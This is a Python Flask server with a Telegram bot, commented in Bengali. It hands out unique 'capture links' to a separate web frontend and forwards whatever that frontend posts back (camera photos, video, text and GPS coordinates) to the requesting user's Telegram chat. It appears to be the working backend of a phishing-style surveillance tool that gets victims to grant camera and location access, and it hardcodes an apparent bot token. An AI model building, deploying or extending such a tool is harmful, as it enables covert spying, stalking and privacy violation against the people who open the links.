import os
import uuid
import logging
import base64
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from telegram import Bot
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio
from dotenv import load_dotenv
from io import BytesIO
import threading

load_dotenv()

# কনফিগারেশন
BOT_TOKEN = os.getenv('BOT_TOKEN', '8667159815:AAF-tTp5BhziyW69NPpcYGzc4l94BUN9_Mg')
PORT = int(os.getenv('PORT', 5000))
FRONTEND_URL = os.getenv('FRONTEND_URL', 'https://magenta-melomakarona-5a38d8.netlify.app/')  # Vercel URL

# লগিং
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask অ্যাপ
app = Flask(__name__)
CORS(app)

# টেলিগ্রাম বট
bot = Bot(token=BOT_TOKEN)

# ইউজার সেশন স্টোর (ডাটাবেসের পরিবর্তে মেমরি)
user_sessions = {}  # session_id -> telegram_user_id

# ================== টেলিগ্রাম বট হ্যান্ডলার ==================

async def start_command(update, context):
    """ /start কমান্ড - ইউনিক URL তৈরি করে """
    user_id = update.effective_user.id
    username = update.effective_user.username or 'User'
    
    # ইউনিক সেশন আইডি তৈরি
    session_id = str(uuid.uuid4())
    
    # সেশন সংরক্ষণ
    user_sessions[session_id] = {
        'telegram_user_id': user_id,
        'username': username,
        'created_at': datetime.now().isoformat(),
        'data_received': []
    }
    
    # ইউনিক URL তৈরি (ফ্রন্টএন্ডের সাথে)
    unique_url = f"{FRONTEND_URL}/?session={session_id}"
    
    # ইউজারকে URL পাঠান
    message = (
        f"🎯 হ্যালো @{username}!\n\n"
        f"আপনার পার্সোনাল ক্যাপচার লিংক:\n\n"
        f"{unique_url}\n\n"
        f"👉 এই লিংকে ক্লিক করুন এবং ক্যামেরা এক্সেস দিন\n"
        f"📸 আপনার সব তথ্য শুধু আপনার টেলিগ্রামে আসবে!"
    )
    
    await update.message.reply_text(message)

async def help_command(update, context):
    """ /help কমান্ড """
    help_text = "/start - নতুন ক্যাপচার লিংক তৈরি করুন\n/help - সাহায্য"
    await update.message.reply_text(help_text)

# ================== API এন্ডপয়েন্ট (ফ্রন্টএন্ড কল করবে) ==================

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok', 'users': len(user_sessions)})

@app.route('/api/validate/<session_id>', methods=['GET'])
def validate_session(session_id):
    """সেশন ভ্যালিড কিনা চেক করুন"""
    if session_id in user_sessions:
        return jsonify({'valid': True})
    return jsonify({'valid': False}), 404

@app.route('/api/capture/<session_id>', methods=['POST'])
def capture_data(session_id):
    """ফ্রন্টএন্ড থেকে ডাটা রিসিভ করুন"""
    # সেশন চেক
    if session_id not in user_sessions:
        return jsonify({'error': 'Invalid session'}), 404
    
    session = user_sessions[session_id]
    data = request.json
    data_type = data.get('type')
    content = data.get('data')
    
    try:
        # টেলিগ্রামে পাঠান
        if data_type == 'text':
            asyncio.run(send_text(session['telegram_user_id'], content))
            
        elif data_type == 'photo':
            img_data = base64.b64decode(content['buffer'])
            asyncio.run(send_photo(
                session['telegram_user_id'], 
                img_data, 
                content.get('caption', '📸 ছবি')
            ))
            
        elif data_type == 'video':
            video_data = base64.b64decode(content['buffer'])
            asyncio.run(send_video(
                session['telegram_user_id'], 
                video_data, 
                content.get('caption', '🎥 ভিডিও')
            ))
            
        elif data_type == 'location':
            asyncio.run(send_location(
                session['telegram_user_id'],
                content['latitude'],
                content['longitude']
            ))
        
        # সেশন আপডেট
        session['data_received'].append({
            'type': data_type,
            'timestamp': datetime.now().isoformat()
        })
        
        return jsonify({'success': True})
        
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'error': str(e)}), 500

# ================== টেলিগ্রাম হেল্পার ==================

async def send_text(chat_id, text):
    await bot.send_message(chat_id=chat_id, text=text)

async def send_photo(chat_id, photo_data, caption):
    photo_file = BytesIO(photo_data)
    photo_file.name = 'photo.jpg'
    await bot.send_photo(chat_id=chat_id, photo=photo_file, caption=caption)

async def send_video(chat_id, video_data, caption):
    video_file = BytesIO(video_data)
    video_file.name = 'video.webm'
    await bot.send_video(chat_id=chat_id, video=video_file, caption=caption)

async def send_location(chat_id, lat, lon):
    await bot.send_location(chat_id=chat_id, latitude=lat, longitude=lon)

# ================== বট সেটআপ ==================

def setup_bot():
    """টেলিগ্রাম বট চালু করুন"""
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # আলাদা থ্রেডে বট চালান
    def run_bot():
        application.run_polling()
    
    thread = threading.Thread(target=run_bot, daemon=True)
    thread.start()

# ================== মেইন ==================

if __name__ == '__main__':
    # বট চালু করুন
    setup_bot()
    logger.info(f"Bot started! Frontend URL: {FRONTEND_URL}")
    
    # Flask অ্যাপ চালান
    app.run(host='0.0.0.0', port=PORT, debug=False)
